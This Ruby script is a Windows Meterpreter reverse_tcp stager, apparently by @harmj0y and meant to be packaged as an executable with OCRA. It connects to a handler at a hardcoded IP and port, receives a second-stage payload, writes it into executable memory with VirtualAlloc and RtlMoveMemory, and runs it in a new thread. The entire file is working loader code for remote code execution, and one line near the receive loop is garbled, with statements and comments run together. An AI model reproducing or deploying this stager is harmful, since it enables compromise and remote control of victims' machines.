#
# Ruby windows/meterpreter/reverse_tcp stager
# Ready for packaging with OCRA
#
# Original inspiration: https://github.com/rsmudge/metasploit-loader
#
# By: @harmj0y
#

require 'rubygems'
require 'win32/api'
require 'socket'
include Win32
exit if Object.const_defined?(:Ocra)

# set up all the WinAPI function declarations
VirtualAlloc = API.new('VirtualAlloc', 'IIII', 'I')
RtlMoveMemory = API.new('RtlMoveMemory', 'IPI', 'V')
CreateThread = API.new('CreateThread', 'IIIIIP', 'I')
WaitForSingleObject = API.new('WaitForSingleObject', 'II', 'I')

# needed to translate a ruby socket into an actual system file descriptor/socket num
get_osfhandle = API.new('_get_osfhandle', 'I', 'I', 'msvcrt.dll')

# connect to our handler
s = TCPSocket.open('192.168.52.150', 4444)

# read/decode the size of the metepreter payload being transmitted
payloadLength = Integer(s.recv(4).unpack('L')[0])

# 5 spaces -> 1 byte for ASM code, 4 byes for socket descriptor (below)
payload = "     "

# make sure we get all of the meterpreter payload
while payload.length < payloadLength payload += s.recv(payloadLength) end #prepend a little assembly to move our SOCKET value to the EDI register # BF 78 56 34 12 => mov edi, 0x12345678
payload[0] = ['BF'].pack("H*")
socketID = get_osfhandle.call(s.fileno)

# copy in the underlying socket ID into the buffer
for i in 1..4
payload[i] = Array(socketID).pack('V')[i-1]
end

# Reserve the necessary amount of virtual address space
# VirtualAlloc needs to have at least 0x1000 specified as the length otherwise it'll fail
ptr = VirtualAlloc.call(0,(payload.length > 0x1000 ? payload.length : 0x1000), 0x1000, 0x40)

# move the payload buffer into the allocated area
x = RtlMoveMemory.call(ptr,payload,payload.length)

# start the thread
handleID = CreateThread.call(0,0,ptr,0,0,0)

# wait a long time for the thread to return
x = WaitForSingleObject.call(handleID,0xFFFFFFF)
